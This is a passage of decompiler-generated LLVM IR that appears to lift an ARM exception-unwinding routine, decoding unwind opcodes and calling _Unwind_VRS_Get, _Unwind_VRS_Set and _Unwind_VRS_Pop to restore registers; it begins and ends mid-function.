  %v2_193ec = icmp eq i8 %v3_193e0, 0
  store i1 %v2_193ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193ec, label %dec_label_pc_193fc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_193f0 = add nsw i32 %v4_193e0, -1
  store i32 %v2_193f0, i32* %r3.global-to-local, align 4
  %v2_193f4 = trunc i32 %v2_193f0 to i8
  store i8 %v2_193f4, i8* %v2_193e0, align 1
  %v0_193f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193f8.pr.pr, label %.thread6.dec_label_pc_193fc_crit_edge, label %dec_label_pc_19328

.thread6.dec_label_pc_193fc_crit_edge:            ; preds = %.thread6
  %v0_193fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193fc

dec_label_pc_193fc:                               ; preds = %bb148, %.thread6.dec_label_pc_193fc_crit_edge
  %v0_193fc = phi i32 [ %v0_193fc.pre, %.thread6.dec_label_pc_193fc_crit_edge ], [ %v0_193e0, %bb148 ]
  %v1_193fc = add i32 %v0_193fc, 9
  %v2_193fc = inttoptr i32 %v1_193fc to i8*
  %v3_193fc = load i8, i8* %v2_193fc, align 1
  %v4_193fc = zext i8 %v3_193fc to i32
  store i32 %v4_193fc, i32* %r3.global-to-local, align 4
  %v2_19400 = icmp eq i8 %v3_193fc, 0
  store i1 %v2_19400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19400, label %dec_label_pc_19408, label %dec_label_pc_1930c

dec_label_pc_19408:                               ; preds = %dec_label_pc_193fc, %dec_label_pc_19300, %dec_label_pc_19328
  %v0_19408 = load i32, i32* @sl, align 4
  %v2_19408 = icmp eq i32 %v0_19408, 0
  store i1 %v2_19408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19408, label %dec_label_pc_194d0, label %bb149

bb149:                                            ; preds = %dec_label_pc_19408
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %bb149, %dec_label_pc_19984, %dec_label_pc_19824, %dec_label_pc_19648, %dec_label_pc_19600, %dec_label_pc_195bc, %dec_label_pc_194d0
  %v1_1941c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19984 ], [ 9, %dec_label_pc_19824 ], [ 9, %dec_label_pc_19648 ], [ 9, %dec_label_pc_19600 ], [ 9, %dec_label_pc_195bc ], [ %v0_19504, %dec_label_pc_194d0 ]
  store i32 %v9_192d8, i32* %r6.global-to-local, align 4
  store i32 %v21_192d8, i32* @lr, align 4
  ret i32 %v1_1941c

dec_label_pc_19420:                               ; preds = %dec_label_pc_19344
  %v1_19420 = mul i32 %v0_19344, 4
  %v3_19424 = and i32 %v1_19420, 252
  store i32 %v3_19424, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19430 = load i32, i32* @r7, align 4
  store i32 %v0_19430, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_19438 = add nuw nsw i32 %v3_19424, 4
  store i32 %v1_19438, i32* %r6.global-to-local, align 4
  %v5_19440 = call i32 @_Unwind_VRS_Get(i32 %v0_19430, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19444 = load i32, i32* @r4, align 4
  %v1_19444 = and i32 %v0_19444, 64
  %v2_19444 = icmp eq i32 %v1_19444, 0
  store i1 %v2_19444, i1* %cpsr_z.global-to-local, align 1
  %v4_1944c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_19458 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_19458
  %storemerge160.p = select i1 %v2_19444, i32 %v2_19458, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1944c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_19474 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192ec.backedge

dec_label_pc_192ec.backedge:                      ; preds = %dec_label_pc_19420, %dec_label_pc_1949c, %dec_label_pc_19920, %dec_label_pc_195ec, %dec_label_pc_19624, %dec_label_pc_195a4, %dec_label_pc_19810
  %v0_192ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192ec

dec_label_pc_1947c:                               ; preds = %dec_label_pc_1934c
  %v7_1947c = icmp eq i32 %v1_1934c, 144
  store i1 %v7_1947c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1947c, label %dec_label_pc_19484, label %dec_label_pc_195c4

dec_label_pc_19484:                               ; preds = %dec_label_pc_1947c
  %v1_19484 = urem i32 %v0_19344, 16
  store i32 %v1_19484, i32* %r2.global-to-local, align 4
  %v2_19488 = icmp eq i32 %v1_19484, 15
  store i1 %v2_19488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19488, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_19484
  %v8_1948c = icmp eq i32 %v1_19484, 13
  store i1 %v8_1948c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1948c, label %bb154, label %dec_label_pc_1949c

.thread21:                                        ; preds = %dec_label_pc_19484
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195bc

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195bc

dec_label_pc_1949c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194a8 = load i32, i32* @r7, align 4
  store i32 %v0_194a8, i32* %r0.global-to-local, align 4
  %v5_194b0 = call i32 @_Unwind_VRS_Get(i32 %v0_194a8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_194b8 = load i32, i32* @r7, align 4
  store i32 %v0_194b8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_194c8 = call i32 @_Unwind_VRS_Set(i32 %v0_194b8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192ec.backedge

dec_label_pc_194d0:                               ; preds = %dec_label_pc_19408
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194e0 = load i32, i32* @r7, align 4
  store i32 %v0_194e0, i32* %r0.global-to-local, align 4
  %v7_194e8 = call i32 @_Unwind_VRS_Get(i32 %v0_194e0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_194ec = load i32, i32* @r7, align 4
  store i32 %v0_194ec, i32* %r0.global-to-local, align 4
  %v0_194f0 = load i32, i32* @sl, align 4
  store i32 %v0_194f0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_194f0, i32* %r3.global-to-local, align 4
  %v5_19500 = call i32 @_Unwind_VRS_Set(i32 %v0_194ec, i32 %v0_194f0, i32 15, i32 %v0_194f0, i8* bitcast (i32* @0 to i8*))
  %v0_19504 = load i32, i32* @sl, align 4
  store i32 %v0_19504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_1950c:                               ; preds = %dec_label_pc_19700
  %v7_1950c = icmp eq i32 %v0_19700, 199
  store i1 %v7_1950c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1950c, label %dec_label_pc_197e0, label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %dec_label_pc_1950c
  %v1_19514 = and i32 %v0_19344, 248
  store i32 %v1_19514, i32* %r3.global-to-local, align 4
  %v7_19518 = icmp eq i32 %v1_19514, 192
  store i1 %v7_19518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19518, label %.thread24, label %dec_label_pc_19530

.thread24:                                        ; preds = %dec_label_pc_19514
  %v2_1951c = urem i32 %v0_19344, 16
  %v2_19520 = add nuw nsw i32 %v2_1951c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19528 = or i32 %v2_19520, 655360
  store i32 %v2_19528, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_19530:                               ; preds = %dec_label_pc_19514
  %v7_19530 = icmp eq i32 %v0_19700, 200
  store i1 %v7_19530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19530, label %dec_label_pc_19774, label %dec_label_pc_19538

dec_label_pc_19538:                               ; preds = %dec_label_pc_19530
  %v7_19538 = icmp eq i32 %v0_19700, 201
  store i1 %v7_19538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19538, label %dec_label_pc_19540, label %dec_label_pc_195bc

dec_label_pc_19540:                               ; preds = %dec_label_pc_19538
  %v0_19540 = load i32, i32* @r5, align 4
  %v1_19540 = add i32 %v0_19540, 8
  %v2_19540 = inttoptr i32 %v1_19540 to i8*
  %v3_19540 = load i8, i8* %v2_19540, align 1
  %v4_19540 = zext i8 %v3_19540 to i32
  store i32 %v4_19540, i32* %r3.global-to-local, align 4
  %v2_19544 = icmp eq i8 %v3_19540, 0
  store i1 %v2_19544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19544, label %dec_label_pc_19554, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_19540
  %v2_19548 = add nsw i32 %v4_19540, -1
  store i32 %v2_19548, i32* %r3.global-to-local, align 4
  %v2_1954c = trunc i32 %v2_19548 to i8
  store i8 %v2_1954c, i8* %v2_19540, align 1
  %v0_19550.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19550.pr.pr, label %.thread26.dec_label_pc_19554_crit_edge, label %dec_label_pc_19588

.thread26.dec_label_pc_19554_crit_edge:           ; preds = %.thread26
  %v0_19554.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %.thread26.dec_label_pc_19554_crit_edge, %dec_label_pc_19540
  %v2_1956c = phi i32 [ %v0_19554.pre, %.thread26.dec_label_pc_19554_crit_edge ], [ %v0_19540, %dec_label_pc_19540 ]
  %v1_19554 = add i32 %v2_1956c, 9
  %v2_19554 = inttoptr i32 %v1_19554 to i8*
  %v3_19554 = load i8, i8* %v2_19554, align 1
  %v4_19554 = zext i8 %v3_19554 to i32
  store i32 %v4_19554, i32* %r3.global-to-local, align 4
  %v2_19558 = icmp eq i8 %v3_19554, 0
  store i1 %v2_19558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19558, label %dec_label_pc_195a4, label %dec_label_pc_19568

dec_label_pc_19568:                               ; preds = %dec_label_pc_19554
  %v1_19568 = add nsw i32 %v4_19554, -1
  store i32 %v1_19568, i32* %r3.global-to-local, align 4
  %v1_1956c = trunc i32 %v1_19568 to i8
  store i8 %v1_1956c, i8* %v2_19554, align 1
  %v0_19570 = load i32, i32* @r5, align 4
  %v1_19570 = add i32 %v0_19570, 4
  %v2_19570 = inttoptr i32 %v1_19570 to i32*
  %v3_19570 = load i32, i32* %v2_19570, align 4
  store i32 %v3_19570, i32* %r2.global-to-local, align 4
  %v1_19574 = inttoptr i32 %v3_19570 to i32*
  %v2_19574 = load i32, i32* %v1_19574, align 4
  store i32 %v2_19574, i32* %r0.global-to-local, align 4
  %v4_19574 = add i32 %v3_19570, 4
  store i32 %v4_19574, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19574, i32* %v2_19570, align 4
  %v0_19580 = load i32, i32* %r3.global-to-local, align 4
  %v1_19580 = trunc i32 %v0_19580 to i8
  %v2_19580 = load i32, i32* @r5, align 4
  %v3_19580 = add i32 %v2_19580, 8
  %v4_19580 = inttoptr i32 %v3_19580 to i8*
  store i8 %v1_19580, i8* %v4_19580, align 1
  %v0_19584 = load i32, i32* %r0.global-to-local, align 4
  %v1_19584 = load i32, i32* @r5, align 4
  %v2_19584 = inttoptr i32 %v1_19584 to i32*
  store i32 %v0_19584, i32* %v2_19584, align 4
  br label %dec_label_pc_19588

dec_label_pc_19588:                               ; preds = %.thread26, %dec_label_pc_19568
  %v0_19588 = load i32, i32* %r0.global-to-local, align 4
  %v3_19588 = udiv i32 %v0_19588, 16777216
  %v1_1958c = urem i32 %v3_19588, 16
  %v3_19590 = mul i32 %v0_19588, 256
  %v1_19594 = add nuw nsw i32 %v1_1958c, 1
  store i32 %v1_19594, i32* %r1.global-to-local, align 4
  %v1_19598 = and i32 %v3_19588, 240
  store i32 %v1_19598, i32* %r3.global-to-local, align 4
  %v1_1959c = load i32, i32* @r5, align 4
  %v2_1959c = inttoptr i32 %v1_1959c to i32*
  store i32 %v3_19590, i32* %v2_1959c, align 4
  %v0_195a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_195a0 = load i32, i32* %r3.global-to-local, align 4
  %v4_195a0 = mul i32 %v1_195a0, 4096
  %v5_195a0 = or i32 %v4_195a0, %v0_195a0
  br label %dec_label_pc_195a4

dec_label_pc_195a4:                               ; preds = %dec_label_pc_19554, %dec_label_pc_19588
  %storemerge = phi i32 [ %v5_195a0, %dec_label_pc_19588 ], [ 720897, %dec_label_pc_19554 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_195a4 = load i32, i32* @r7, align 4
  store i32 %v0_195a4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_195b0 = call i32 @_Unwind_VRS_Pop(i32 %v0_195a4, i32 1, i32 5, i32 5)
  store i32 %v4_195b0, i32* %r0.global-to-local, align 4
  %v2_195b4 = icmp eq i32 %v4_195b0, 0
  store i1 %v2_195b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195b4, label %dec_label_pc_192ec.backedge, label %dec_label_pc_195bc

dec_label_pc_195bc:                               ; preds = %dec_label_pc_19808, %dec_label_pc_19538, %dec_label_pc_19618, %dec_label_pc_199bc, %dec_label_pc_1998c, %dec_label_pc_19968, %dec_label_pc_197f4, %dec_label_pc_195a4, %dec_label_pc_193b8, %dec_label_pc_193ac, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_195c4:                               ; preds = %dec_label_pc_1947c
  %v7_195c4 = icmp eq i32 %v1_1934c, 160
  store i1 %v7_195c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195c4, label %dec_label_pc_195cc, label %dec_label_pc_19608

dec_label_pc_195cc:                               ; preds = %dec_label_pc_195c4
  %v0_195cc = load i32, i32* %ip.global-to-local, align 4
  %v1_195cc = urem i32 %v0_195cc, 8
  %v1_195d0 = xor i32 %v1_195cc, 7
  store i32 %v1_195d0, i32* %r3.global-to-local, align 4
  %v6_195d8 = lshr i32 4080, %v1_195d0
  %v1_195dc = and i32 %v0_19344, 8
  %v2_195dc = icmp eq i32 %v1_195dc, 0
  store i1 %v2_195dc, i1* %cpsr_z.global-to-local, align 1
  %v1_195e0 = and i32 %v6_195d8, 4080
  %tmp155 = mul nuw nsw i32 %v1_195dc, 2048
  %tmp156 = or i32 %v1_195e0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_195ec:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1997c.dec_label_pc_195ec_crit_edge, %bb157, %dec_label_pc_197d8, %dec_label_pc_1976c, %dec_label_pc_196cc, %dec_label_pc_195cc
  %v2_195f4 = phi i32 [ %v2_196f0, %.thread44 ], [ %v2_196f8, %bb157 ], [ %v2_195f4.pre, %dec_label_pc_1997c.dec_label_pc_195ec_crit_edge ], [ %v2_19528, %.thread24 ], [ %storemerge130, %dec_label_pc_197d8 ], [ %storemerge131, %dec_label_pc_1976c ], [ %storemerge132, %dec_label_pc_196cc ], [ %tmp156, %dec_label_pc_195cc ]
  %v0_195f0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1997c.dec_label_pc_195ec_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_197d8 ], [ 3, %dec_label_pc_1976c ], [ 1, %dec_label_pc_196cc ], [ 0, %dec_label_pc_195cc ]
  %v0_195ec = load i32, i32* @r7, align 4
  store i32 %v0_195ec, i32* %r0.global-to-local, align 4
  store i32 %v0_195f0, i32* %r3.global-to-local, align 4
  %v4_195f4 = call i32 @_Unwind_VRS_Pop(i32 %v0_195ec, i32 %v0_195f0, i32 %v2_195f4, i32 %v0_195f0)
  store i32 %v4_195f4, i32* %r0.global-to-local, align 4
  %v2_195f8 = icmp eq i32 %v4_195f4, 0
  store i1 %v2_195f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195f8, label %dec_label_pc_192ec.backedge, label %dec_label_pc_19600

dec_label_pc_19600:                               ; preds = %dec_label_pc_195ec
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_19608:                               ; preds = %dec_label_pc_195c4
  %v7_19608 = icmp eq i32 %v1_1934c, 176
  store i1 %v7_19608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19608, label %dec_label_pc_19650, label %dec_label_pc_19610

dec_label_pc_19610:                               ; preds = %dec_label_pc_19608
  %v7_19610 = icmp eq i32 %v1_1934c, 192
  store i1 %v7_19610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19610, label %dec_label_pc_19700, label %dec_label_pc_19618

dec_label_pc_19618:                               ; preds = %dec_label_pc_19610
  %v1_19618 = and i32 %v0_19344, 248
  store i32 %v1_19618, i32* %r3.global-to-local, align 4
  %v7_1961c = icmp eq i32 %v1_19618, 208
  store i1 %v7_1961c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1961c, label %dec_label_pc_19624, label %dec_label_pc_195bc

dec_label_pc_19624:                               ; preds = %dec_label_pc_19618
  %v1_19624 = urem i32 %v0_19344, 8
  %v1_19628 = add nuw nsw i32 %v1_19624, 1
  %v1_1962c = or i32 %v1_19628, 524288
  store i32 %v1_1962c, i32* %r2.global-to-local, align 4
  %v0_19630 = load i32, i32* @r7, align 4
  store i32 %v0_19630, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1963c = call i32 @_Unwind_VRS_Pop(i32 %v0_19630, i32 1, i32 %v1_1962c, i32 5)
  store i32 %v4_1963c, i32* %r0.global-to-local, align 4
  %v2_19640 = icmp eq i32 %v4_1963c, 0
  store i1 %v2_19640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19640, label %dec_label_pc_192ec.backedge, label %dec_label_pc_19648

dec_label_pc_19648:                               ; preds = %dec_label_pc_19624
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_19650:                               ; preds = %dec_label_pc_19608
  %v0_19650 = load i32, i32* %ip.global-to-local, align 4
  %v7_19650 = icmp eq i32 %v0_19650, 177
  store i1 %v7_19650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19650, label %dec_label_pc_19954, label %dec_label_pc_19658

dec_label_pc_19658:                               ; preds = %dec_label_pc_19650
  %v7_19658 = icmp eq i32 %v0_19650, 178
  store i1 %v7_19658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19658, label %dec_label_pc_1982c, label %dec_label_pc_19660

dec_label_pc_19660:                               ; preds = %dec_label_pc_19658
  %v7_19660 = icmp eq i32 %v0_19650, 179
  store i1 %v7_19660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19660, label %dec_label_pc_19668, label %dec_label_pc_196d4

dec_label_pc_19668:                               ; preds = %dec_label_pc_19660
  %v0_19668 = load i32, i32* @r5, align 4
  %v1_19668 = add i32 %v0_19668, 8
  %v2_19668 = inttoptr i32 %v1_19668 to i8*
  %v3_19668 = load i8, i8* %v2_19668, align 1
  %v4_19668 = zext i8 %v3_19668 to i32
  store i32 %v4_19668, i32* %r3.global-to-local, align 4
  %v2_1966c = icmp eq i8 %v3_19668, 0
  store i1 %v2_1966c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1966c, label %dec_label_pc_1967c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_19668
  %v2_19670 = add nsw i32 %v4_19668, -1
  store i32 %v2_19670, i32* %r3.global-to-local, align 4
  %v2_19674 = trunc i32 %v2_19670 to i8
  store i8 %v2_19674, i8* %v2_19668, align 1
  %v0_19678.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19678.pr.pr, label %.thread30.dec_label_pc_1967c_crit_edge, label %dec_label_pc_196b0

.thread30.dec_label_pc_1967c_crit_edge:           ; preds = %.thread30
  %v0_1967c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1967c

dec_label_pc_1967c:                               ; preds = %.thread30.dec_label_pc_1967c_crit_edge, %dec_label_pc_19668
  %v2_19694 = phi i32 [ %v0_1967c.pre, %.thread30.dec_label_pc_1967c_crit_edge ], [ %v0_19668, %dec_label_pc_19668 ]
  %v1_1967c = add i32 %v2_19694, 9
  %v2_1967c = inttoptr i32 %v1_1967c to i8*
  %v3_1967c = load i8, i8* %v2_1967c, align 1
  %v4_1967c = zext i8 %v3_1967c to i32
  store i32 %v4_1967c, i32* %r3.global-to-local, align 4
  %v2_19680 = icmp eq i8 %v3_1967c, 0
  store i1 %v2_19680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19680, label %dec_label_pc_196cc, label %dec_label_pc_19690

dec_label_pc_19690:                               ; preds = %dec_label_pc_1967c
  %v1_19690 = add nsw i32 %v4_1967c, -1
  store i32 %v1_19690, i32* %r3.global-to-local, align 4
  %v1_19694 = trunc i32 %v1_19690 to i8
  store i8 %v1_19694, i8* %v2_1967c, align 1
  %v0_19698 = load i32, i32* @r5, align 4
  %v1_19698 = add i32 %v0_19698, 4
  %v2_19698 = inttoptr i32 %v1_19698 to i32*
  %v3_19698 = load i32, i32* %v2_19698, align 4
  store i32 %v3_19698, i32* %r2.global-to-local, align 4
  %v1_1969c = inttoptr i32 %v3_19698 to i32*
  %v2_1969c = load i32, i32* %v1_1969c, align 4
  store i32 %v2_1969c, i32* %r0.global-to-local, align 4
  %v4_1969c = add i32 %v3_19698, 4
  store i32 %v4_1969c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1969c, i32* %v2_19698, align 4
  %v0_196a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_196a8 = trunc i32 %v0_196a8 to i8
  %v2_196a8 = load i32, i32* @r5, align 4
  %v3_196a8 = add i32 %v2_196a8, 8
  %v4_196a8 = inttoptr i32 %v3_196a8 to i8*
  store i8 %v1_196a8, i8* %v4_196a8, align 1
  %v0_196ac = load i32, i32* %r0.global-to-local, align 4
  %v1_196ac = load i32, i32* @r5, align 4
  %v2_196ac = inttoptr i32 %v1_196ac to i32*
  store i32 %v0_196ac, i32* %v2_196ac, align 4
  br label %dec_label_pc_196b0

dec_label_pc_196b0:                               ; preds = %.thread30, %dec_label_pc_19690
  %v0_196b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_196b0 = udiv i32 %v0_196b0, 16777216
  %v1_196b4 = urem i32 %v3_196b0, 16
  %v3_196b8 = mul i32 %v0_196b0, 256
  store i32 %v3_196b8, i32* %r0.global-to-local, align 4
  %v1_196bc = add nuw nsw i32 %v1_196b4, 1
  store i32 %v1_196bc, i32* %r2.global-to-local, align 4
  %v1_196c0 = and i32 %v3_196b0, 240
  store i32 %v1_196c0, i32* %r3.global-to-local, align 4
  %v1_196c4 = load i32, i32* @r5, align 4
  %v2_196c4 = inttoptr i32 %v1_196c4 to i32*
  store i32 %v3_196b8, i32* %v2_196c4, align 4
  %v0_196c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_196c8 = load i32, i32* %r3.global-to-local, align 4
  %v4_196c8 = mul i32 %v1_196c8, 4096
  %v5_196c8 = or i32 %v4_196c8, %v0_196c8
  br label %dec_label_pc_196cc

dec_label_pc_196cc:                               ; preds = %dec_label_pc_1967c, %dec_label_pc_196b0
  %storemerge132 = phi i32 [ %v5_196c8, %dec_label_pc_196b0 ], [ 720897, %dec_label_pc_1967c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_196d4:                               ; preds = %dec_label_pc_19660
  %v1_196d4 = and i32 %v0_19344, 252
  store i32 %v1_196d4, i32* %r3.global-to-local, align 4
  %v7_196d8 = icmp eq i32 %v1_196d4, 180
  store i1 %v7_196d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196d8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_196d4
  %v2_196dc = urem i32 %v0_19344, 4
  %v2_196e4 = add nuw nsw i32 %v2_196dc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_196f0 = or i32 %v2_196e4, 262144
  store i32 %v2_196f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195ec

bb157:                                            ; preds = %dec_label_pc_196d4
  %v2_196e0 = urem i32 %v0_19650, 8
  %v2_196e8 = add nuw nsw i32 %v2_196e0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_196f8 = or i32 %v2_196e8, 524288
  store i32 %v2_196f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_19700:                               ; preds = %dec_label_pc_19610
  %v0_19700 = load i32, i32* %ip.global-to-local, align 4
  %v7_19700 = icmp eq i32 %v0_19700, 198
  store i1 %v7_19700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19700, label %dec_label_pc_19708, label %dec_label_pc_1950c

dec_label_pc_19708:                               ; preds = %dec_label_pc_19700
  %v0_19708 = load i32, i32* @r5, align 4
  %v1_19708 = add i32 %v0_19708, 8
  %v2_19708 = inttoptr i32 %v1_19708 to i8*
  %v3_19708 = load i8, i8* %v2_19708, align 1
  %v4_19708 = zext i8 %v3_19708 to i32
  store i32 %v4_19708, i32* %r3.global-to-local, align 4
  %v2_1970c = icmp eq i8 %v3_19708, 0
  store i1 %v2_1970c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1970c, label %dec_label_pc_1971c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19708
  %v2_19710 = add nsw i32 %v4_19708, -1
  store i32 %v2_19710, i32* %r3.global-to-local, align 4
  %v2_19714 = trunc i32 %v2_19710 to i8
  store i8 %v2_19714, i8* %v2_19708, align 1
  %v0_19718.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19718.pr.pr, label %.thread48.dec_label_pc_1971c_crit_edge, label %dec_label_pc_19750

.thread48.dec_label_pc_1971c_crit_edge:           ; preds = %.thread48
  %v0_1971c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1971c

dec_label_pc_1971c:                               ; preds = %.thread48.dec_label_pc_1971c_crit_edge, %dec_label_pc_19708
  %v2_19734 = phi i32 [ %v0_1971c.pre, %.thread48.dec_label_pc_1971c_crit_edge ], [ %v0_19708, %dec_label_pc_19708 ]
  %v1_1971c = add i32 %v2_19734, 9
  %v2_1971c = inttoptr i32 %v1_1971c to i8*
  %v3_1971c = load i8, i8* %v2_1971c, align 1
  %v4_1971c = zext i8 %v3_1971c to i32
  store i32 %v4_1971c, i32* %r3.global-to-local, align 4
  %v2_19720 = icmp eq i8 %v3_1971c, 0
  store i1 %v2_19720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19720, label %dec_label_pc_1976c, label %dec_label_pc_19730

dec_label_pc_19730:                               ; preds = %dec_label_pc_1971c
  %v1_19730 = add nsw i32 %v4_1971c, -1
  store i32 %v1_19730, i32* %r3.global-to-local, align 4
  %v1_19734 = trunc i32 %v1_19730 to i8
  store i8 %v1_19734, i8* %v2_1971c, align 1
  %v0_19738 = load i32, i32* @r5, align 4
  %v1_19738 = add i32 %v0_19738, 4
  %v2_19738 = inttoptr i32 %v1_19738 to i32*
  %v3_19738 = load i32, i32* %v2_19738, align 4
  store i32 %v3_19738, i32* %r2.global-to-local, align 4
  %v1_1973c = inttoptr i32 %v3_19738 to i32*
  %v2_1973c = load i32, i32* %v1_1973c, align 4
  store i32 %v2_1973c, i32* %r0.global-to-local, align 4
  %v4_1973c = add i32 %v3_19738, 4
  store i32 %v4_1973c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1973c, i32* %v2_19738, align 4
  %v0_19748 = load i32, i32* %r3.global-to-local, align 4
  %v1_19748 = trunc i32 %v0_19748 to i8
  %v2_19748 = load i32, i32* @r5, align 4
  %v3_19748 = add i32 %v2_19748, 8
  %v4_19748 = inttoptr i32 %v3_19748 to i8*
  store i8 %v1_19748, i8* %v4_19748, align 1
  %v0_1974c = load i32, i32* %r0.global-to-local, align 4
  %v1_1974c = load i32, i32* @r5, align 4
  %v2_1974c = inttoptr i32 %v1_1974c to i32*
  store i32 %v0_1974c, i32* %v2_1974c, align 4
  br label %dec_label_pc_19750

dec_label_pc_19750:                               ; preds = %.thread48, %dec_label_pc_19730
